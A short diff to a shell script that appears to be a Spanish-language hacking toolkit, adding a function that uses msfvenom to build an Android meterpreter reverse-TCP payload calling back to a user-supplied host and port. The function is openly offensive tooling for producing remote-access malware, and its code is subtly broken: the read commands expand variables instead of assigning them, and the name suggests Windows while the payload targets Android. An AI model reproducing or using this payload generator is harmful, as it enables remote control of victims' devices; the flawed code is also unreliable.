@@ -50,6 +50,16 @@ function nmapscan() {
         nmap -sT $network
 }
 
+#Funcion shell reversa con meterpreter
+function winrev() {
+	payload="android/meterpreter/reverse_tcp"
+	read $HOST
+	read $PORT
+	read $DIR
+	msfvenom -p $payload LHOST=$HOST LPORT=$PORT R> $DIR
+
+}
+
 #Banner
 function banner() {
 	printf "\e[1;92m    _    _  _____ ____    _      _   _    _    ____ _  __ \n"
